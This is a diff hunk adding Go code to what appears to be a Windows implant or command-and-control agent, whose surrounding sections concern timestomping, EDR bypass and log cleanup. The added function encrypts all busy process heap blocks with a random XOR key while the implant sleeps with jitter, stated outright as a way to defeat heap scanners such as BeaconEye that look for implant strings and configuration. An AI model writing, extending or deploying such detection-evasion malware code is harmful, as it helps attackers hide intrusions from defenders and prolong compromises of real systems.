@@ -251,6 +251,94 @@ func Timestomp(filepath string, referenceFile string) error {
 }
 
 // ══════════════════════════════════════════
+//  HEAP ENCRYPTION DURING SLEEP
+// ══════════════════════════════════════════
+
+var (
+	pHeapLock   = stealthKernel32.NewProc("HeapLock")
+	pHeapUnlock = stealthKernel32.NewProc("HeapUnlock")
+	pHeapWalk   = stealthKernel32.NewProc("HeapWalk")
+)
+
+// processHeapEntry mirrors the Win32 PROCESS_HEAP_ENTRY structure.
+type processHeapEntry struct {
+	Data             uintptr
+	cbData           uint32
+	cbOverhead       byte
+	iRegionIndex     byte
+	wFlags           uint16
+	_                [4]byte // union padding (Region or Block)
+	regionCommitted  uint32
+	regionUnCommit   uint32
+	regionFirstBlock uintptr
+	regionLastBlock  uintptr
+}
+
+const (
+	PROCESS_HEAP_REGION           = 0x0001
+	PROCESS_HEAP_UNCOMMITTED_RANGE = 0x0002
+	PROCESS_HEAP_ENTRY_BUSY       = 0x0004
+)
+
+// HeapEncryptSleep encrypts all busy heap blocks with a random XOR key,
+// sleeps for the specified duration, then decrypts on wake.
+// This defeats heap scanners like BeaconEye that look for implant
+// strings/config in process heap memory during sleep.
+func HeapEncryptSleep(sleepSec, jitterPct int) {
+	// Generate a random 32-byte XOR key for this sleep cycle
+	key := make([]byte, 32)
+	rand.Read(key)
+
+	// Get the default process heap (pGetProcessHeap defined in edr_bypass_windows.go)
+	heapHandle, _, _ := pGetProcessHeap.Call()
+	if heapHandle == 0 {
+		SleepWithJitter(sleepSec, jitterPct)
+		return
+	}
+
+	// Lock the heap before walking to prevent concurrent allocations
+	pHeapLock.Call(heapHandle)
+
+	// Walk heap and XOR all busy blocks
+	var entry processHeapEntry
+	entry.cbData = uint32(unsafe.Sizeof(entry))
+
+	ret, _, _ := pHeapWalk.Call(heapHandle, uintptr(unsafe.Pointer(&entry)))
+	for ret != 0 {
+		if entry.wFlags&PROCESS_HEAP_ENTRY_BUSY != 0 && entry.Data != 0 && entry.cbData > 0 {
+			// XOR each byte of this heap block with the key
+			block := unsafe.Slice((*byte)(unsafe.Pointer(entry.Data)), entry.cbData)
+			for i := range block {
+				block[i] ^= key[i%32]
+			}
+		}
+		ret, _, _ = pHeapWalk.Call(heapHandle, uintptr(unsafe.Pointer(&entry)))
+	}
+
+	pHeapUnlock.Call(heapHandle)
+
+	// Sleep while heap is encrypted
+	SleepWithJitter(sleepSec, jitterPct)
+
+	// Re-lock and decrypt (XOR again reverses it)
+	pHeapLock.Call(heapHandle)
+
+	entry.cbData = uint32(unsafe.Sizeof(entry))
+	ret, _, _ = pHeapWalk.Call(heapHandle, uintptr(unsafe.Pointer(&entry)))
+	for ret != 0 {
+		if entry.wFlags&PROCESS_HEAP_ENTRY_BUSY != 0 && entry.Data != 0 && entry.cbData > 0 {
+			block := unsafe.Slice((*byte)(unsafe.Pointer(entry.Data)), entry.cbData)
+			for i := range block {
+				block[i] ^= key[i%32]
+			}
+		}
+		ret, _, _ = pHeapWalk.Call(heapHandle, uintptr(unsafe.Pointer(&entry)))
+	}
+
+	pHeapUnlock.Call(heapHandle)
+}
+
+// ══════════════════════════════════════════
 //  LOG CLEANUP
 // ══════════════════════════════════════════
 
